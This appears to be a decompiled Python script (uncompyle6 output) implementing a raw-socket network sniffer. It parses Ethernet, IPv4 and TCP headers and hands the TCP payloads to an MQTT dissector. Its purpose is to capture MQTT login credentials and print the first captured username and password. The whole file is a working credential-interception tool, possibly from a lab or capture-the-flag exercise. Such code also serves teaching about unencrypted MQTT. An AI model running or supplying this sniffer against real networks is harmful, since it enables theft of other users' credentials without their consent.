# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.6 (default, Sep 25 2020, 09:36:53) 
# [GCC 10.2.0]
# Embedded file name: /media/sf_VBox/sniffer_raw_socket.py
# Compiled at: 2020-09-17 17:02:17
# Size of source mod 2**32: 3029 bytes
import socket, struct, time
from struct import unpack
from mqtt_dissector import MQTT_Dissector

class Sniffer:
    ETH_P_ALL = 3
    ETH_FRAME_LEN = 14
    ETH_TYPE_IPV4 = 2048
    IPV4_MIN_HEADER_LEN = 20
    IPV4_PROTO_TCP = 6
    TCP_MIN_HEADER_LEN = 20

    def __init__(self, host='127.0.0.1', port=1883):
        self.user = None
        self.password = None
        self.status = 0
        self.socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(self.ETH_P_ALL))
        self.mqtt_dissector = MQTT_Dissector()
        self.sniff()

    def sniff(self):
        while self.status == 0:
            eth_frame = self.socket.recvfrom(65565)[0]
            eth_header = eth_frame[:self.ETH_FRAME_LEN]
            src_mac, dst_mac, eth_type = unpack('!6s6sH', eth_header)
            if eth_type == self.ETH_TYPE_IPV4:
                ip_packet = eth_frame[self.ETH_FRAME_LEN:]
                ip_header = ip_packet[:self.IPV4_MIN_HEADER_LEN]
                version_ipheaderlen, *_, protocol, _, s_addr, d_addr = unpack('!BBHHHBBHII', ip_header)
                real_ip_header_length = (version_ipheaderlen & 15) * 4
                s_addr = socket.inet_ntoa(struct.pack('!L', s_addr))
                d_addr = socket.inet_ntoa(struct.pack('!L', d_addr))
                if protocol == self.IPV4_PROTO_TCP:
                    tcp_packet = ip_packet[real_ip_header_length:]
                    tcp_header = tcp_packet[:self.TCP_MIN_HEADER_LEN]
                    source_port, dest_port, _, _, doff_reserved, *_ = unpack('!HHLLBBHHH', tcp_header)
                    tcph_length = (doff_reserved >> 4) * 4
                    tcp_payload = tcp_packet[tcph_length:]
                    uid, pw = self.mqtt_dissector.parse_tcp_packet(s_addr, d_addr, source_port, dest_port, tcp_payload)
                    if not uid == None:
                        if not pw == None:
                            self.user = uid
                            self.password = pw
                            self.status = 1


if __name__ == '__main__':
    instance = Sniffer()
    while True:
        time.sleep(1)
        if instance.status == 1:
            print('User: ' + instance.user)
            print('Password: ' + instance.password)
            break
# okay decompiling sniffer_raw_socket.pyc
